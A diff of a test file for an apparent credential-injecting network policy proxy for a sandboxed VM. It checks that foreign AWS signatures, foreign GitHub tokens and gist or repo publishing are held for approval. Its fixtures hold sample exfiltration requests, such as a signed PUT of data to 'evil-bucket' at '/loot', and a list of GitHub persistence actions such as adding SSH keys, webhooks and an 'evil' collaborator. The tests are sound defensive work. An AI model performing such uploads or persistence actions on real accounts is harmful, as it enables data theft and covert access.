@@ -8,15 +8,16 @@ import { SignatureV4 } from "@smithy/signature-v4";
 import { Sha256 } from "@aws-crypto/sha256-js";
 
 const REAL = { AccessKeyId: "AKIAREALREALREALREAL", SecretAccessKey: "realsecretrealsecretrealsecretrealsecret", SessionToken: "realsession" };
-const PH = "NONOPI00000000000001";
+const PH = "GONDOP00000000000001";
 const spec = {
-	aws: { enabled: true, profiles: { [PH]: "acct-a" }, currentKey: "NONOPI00000000000000" },
-	routes: { github: { host: "api.github.com", placeholder: "nonopi_github_x", format: "token {}", header: "authorization", excludePaths: ["/copilot_internal"], guard: "github" } },
+	aws: { enabled: true, profiles: { [PH]: "acct-a" }, currentKey: "GONDOP00000000000000" },
+	routes: { github: { host: "api.github.com", placeholder: "gondopi_github_x", format: "token {}", header: "authorization", excludePaths: ["/copilot_internal"], guard: "github" } },
 	net: { allow: ["registry.npmjs.org", "*.pythonhosted.org"], ask: true },
 };
 const asked = [];
 let current = null;
 const pushAsked = [];
+const netAsked = [];
 const pol = createPolicy({
 	getSpec: () => spec,
 	log: () => {},
@@ -25,6 +26,7 @@ const pol = createPolicy({
 		if (o.op === "aws-current") return { ok: true, account: current };
 		if (o.op === "route-secret") return o.name === "github" && o.host === "api.github.com" ? { ok: true, value: "gho_REAL" } : { ok: false };
 		if (o.op === "net-approve") { asked.push(o.host); return { ok: o.host === "ok.example.com" }; }
+		if (o.op === "net-ask") { netAsked.push(`${o.kind}:${o.resource}`); return { ok: false }; }
 		if (o.op === "gh-push-check") { pushAsked.push(o.repo || o.what); return { ok: o.repo === "me/granted", error: "denied" }; }
 		return { ok: false };
 	},
@@ -71,7 +73,7 @@ for (const [url, method, headers, body, service, region] of [
 {
 	const mk = async () => {
 		const u = new URL("https://sts.eu-west-2.amazonaws.com/");
-		const sg = new SignatureV4({ credentials: { accessKeyId: "NONOPI00000000000000", secretAccessKey: "x" }, region: "eu-west-2", service: "sts", sha256: Sha256 });
+		const sg = new SignatureV4({ credentials: { accessKeyId: "GONDOP00000000000000", secretAccessKey: "x" }, region: "eu-west-2", service: "sts", sha256: Sha256 });
 		const signed = await sg.sign({ method: "POST", protocol: u.protocol, hostname: u.hostname, path: "/", query: {}, headers: { host: u.host, "content-type": "application/x-www-form-urlencoded" }, body: "Action=GetCallerIdentity&Version=2011-06-15" });
 		return new Request(u, { method: "POST", headers: signed.headers, body: "Action=GetCallerIdentity&Version=2011-06-15", duplex: "half" });
 	};
@@ -93,27 +95,32 @@ for (const body of ["Action=AssumeRole&Version=2011-06-15&RoleArn=x", "Action=Ge
 	const out = await pol.onRequest(await guestReq("https://api.ecr.eu-west-2.amazonaws.com/", "POST", { "content-type": "application/x-amz-json-1.1", "x-amz-target": "AmazonEC2ContainerRegistry_V20150921.GetAuthorizationToken" }, "{}", "ecr", "eu-west-2"));
 	assert.equal(out.status, 403, "ecr GetAuthorizationToken blocked");
 }
-// a request signed with something that is NOT our placeholder passes through untouched
+// a request signed with keys that are NOT ours asks (denied here): e.g. uploading to someone else's bucket
 {
-	const r = new Request("https://sts.amazonaws.com/", { method: "POST", headers: { authorization: "AWS4-HMAC-SHA256 Credential=AKIAOTHER/20260101/us-east-1/sts/aws4_request, SignedHeaders=host, Signature=00" }, body: "Action=GetCallerIdentity", duplex: "half" });
-	assert.equal(await pol.onRequest(r), undefined);
+	const r = new Request("https://evil-bucket.s3.eu-west-2.amazonaws.com/loot", { method: "PUT", headers: { authorization: "AWS4-HMAC-SHA256 Credential=AKIAOTHER/20260101/eu-west-2/s3/aws4_request, SignedHeaders=host, Signature=00" }, body: "data", duplex: "half" });
+	const out = await pol.onRequest(r);
+	assert.ok(out instanceof Response && out.status === 403, "foreign AWS signature asks");
+	const pre = await pol.onRequest(new Request("https://evil-bucket.s3.amazonaws.com/x?X-Amz-Credential=AKIAOTHER%2F20260101%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=00", { method: "PUT", body: "d", duplex: "half" }));
+	assert.ok(pre instanceof Response && pre.status === 403, "presigned foreign URL asks");
+	assert.equal(await pol.onRequest(new Request("https://my-bucket.s3.amazonaws.com/public.txt")), undefined, "unsigned public GET passes");
 }
 // aws-chunked bodies are decoded before re-signing
 assert.equal(Buffer.from(decodeAwsChunked(Buffer.from("5;chunk-signature=aa\r\nhello\r\n6;chunk-signature=bb\r\n world\r\n0;chunk-signature=cc\r\n\r\n"))).toString(), "hello world");
 
 // --- credential routes: placeholder -> real, only on its host and paths
 {
-	const out = await pol.onRequest(new Request("https://api.github.com/user", { headers: { authorization: "token nonopi_github_x" } }));
+	const out = await pol.onRequest(new Request("https://api.github.com/user", { headers: { authorization: "token gondopi_github_x" } }));
 	assert.equal(out.headers.get("authorization"), "token gho_REAL");
-	assert.equal(await pol.onRequest(new Request("https://api.github.com/copilot_internal/v2/token", { headers: { authorization: "token nonopi_github_x" } })), undefined, "copilot path excluded");
-	assert.equal(await pol.onRequest(new Request("https://api.github.com/user", { headers: { authorization: "token gho_user_brought" } })), undefined, "foreign tokens pass through");
-	assert.equal(await pol.onRequest(new Request("https://evil.example.com/", { headers: { authorization: "token nonopi_github_x" } })), undefined, "never injected on other hosts");
+	assert.equal(await pol.onRequest(new Request("https://api.github.com/copilot_internal/v2/token", { headers: { authorization: "token gondopi_github_x" } })), undefined, "copilot path excluded");
+	const fb = await pol.onRequest(new Request("https://api.github.com/user", { headers: { authorization: "token gho_user_brought" } }));
+	assert.ok(fb instanceof Response && fb.status === 403, "foreign tokens ask (denied in this test)");
+	assert.equal(await pol.onRequest(new Request("https://evil.example.com/", { headers: { authorization: "token gondopi_github_x" } })), undefined, "never injected on other hosts");
 }
 
 // --- GitHub guard: your token can't be used for account/repo admin or persistence
 {
 	const gh = (method, path, body) => pol.onRequest(new Request(`https://api.github.com${path}`,
-		{ method, headers: { authorization: "token nonopi_github_x", "content-type": "application/json" }, body, duplex: "half" }));
+		{ method, headers: { authorization: "token gondopi_github_x", "content-type": "application/json" }, body, duplex: "half" }));
 	const isBlocked = async (r) => r instanceof Response && r.status === 403;
 	for (const [m, p] of [["POST", "/user/keys"], ["POST", "/user/ssh_signing_keys"], ["POST", "/user/gpg_keys"],
 		["POST", "/repos/me/repo/keys"], ["POST", "/repos/me/repo/hooks"], ["PUT", "/repos/me/repo/collaborators/evil"],
@@ -124,7 +131,7 @@ assert.equal(Buffer.from(decodeAwsChunked(Buffer.from("5;chunk-signature=aa\r\nh
 	}
 	// reads and normal collaboration work
 	for (const [m, p] of [["GET", "/user/keys"], ["GET", "/repos/me/repo"], ["POST", "/repos/me/repo/issues"], ["POST", "/repos/me/repo/pulls"],
-		["POST", "/repos/me/repo/issues/1/comments"], ["POST", "/repos/me/repo/pulls/1/reviews"], ["PATCH", "/repos/me/repo/pulls/1"], ["POST", "/gists"]]) {
+		["POST", "/repos/me/repo/issues/1/comments"], ["POST", "/repos/me/repo/pulls/1/reviews"], ["PATCH", "/repos/me/repo/pulls/1"]]) {
 		const r = await gh(m, p, m === "GET" ? undefined : "{}");
 		assert.ok(r instanceof Request && r.headers.get("authorization") === "token gho_REAL", `${m} ${p} allowed with the real token`);
 	}
@@ -144,8 +151,16 @@ assert.equal(Buffer.from(decodeAwsChunked(Buffer.from("5;chunk-signature=aa\r\nh
 	assert.ok(await isBlocked(await q('mutation { createCommitOnBranch(input:{}) { clientMutationId } }')), "graphql commit without grant refused");
 	assert.equal(classifyRest("GET", "/user/keys").action, "allow");
 	assert.equal(classifyGraphql("not json").action, "deny");
-	// a token the VM brought itself is not ours: untouched (and not guarded - it isn't your token)
-	assert.equal(await pol.onRequest(new Request("https://api.github.com/user/keys", { method: "POST", headers: { authorization: "token gho_theirs" }, body: "{}", duplex: "half" })), undefined);
+	// publishing asks (denied here)
+	assert.ok(await isBlocked(await gh("POST", "/gists", "{}")), "gist creation asks");
+	assert.ok(await isBlocked(await gh("POST", "/user/repos", "{}")), "repo creation asks");
+	assert.ok(await isBlocked(await q('mutation { createGist(input:{}) { clientMutationId } }')), "graphql createGist asks");
+	// a token the VM brought itself: asks (denied here) except on the Copilot path
+	const foreign = await pol.onRequest(new Request("https://api.github.com/user/keys", { method: "POST", headers: { authorization: "token gho_theirs" }, body: "{}", duplex: "half" }));
+	assert.ok(foreign instanceof Response && foreign.status === 403, "foreign token asks");
+	assert.equal(await pol.onRequest(new Request("https://api.github.com/copilot_internal/v2/token", { headers: { authorization: "token gho_theirs" } })), undefined, "copilot path: foreign token passes");
+	assert.ok(netAsked.includes("foreign-token:api.github.com"));
+	assert.ok(netAsked.some((x) => x.startsWith("gh-publish:POST /gists")));
 }
 
 // --- host policy
